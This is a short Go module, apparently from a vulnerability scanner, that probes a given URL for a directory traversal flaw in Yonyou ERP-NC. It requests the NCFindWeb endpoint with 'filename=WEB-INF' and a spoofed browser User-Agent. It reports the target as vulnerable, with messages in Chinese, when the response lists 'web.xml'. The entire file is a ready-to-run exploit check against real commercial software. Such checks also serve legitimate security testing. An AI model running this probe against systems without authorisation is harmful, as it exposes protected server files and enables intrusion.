package ERP_NC_MLBL

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF"
	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent": UA,
	}).Get(url)

	if err != nil {
		color.Red.Println("[-] 用友 ERP-NC 目录遍历漏洞不存在")
		return
	}

	// 检查状态码为200且响应体中包含"web.xml"
	if resp.Status == "200 OK" && strings.Contains(resp.String(), "web.xml") {
		color.Green.Println("[+] 用友 ERP-NC 目录遍历漏洞存在 -> " + url)
		return
	}

	color.Red.Println("[-] 用友 ERP-NC 目录遍历漏洞不存在")
}
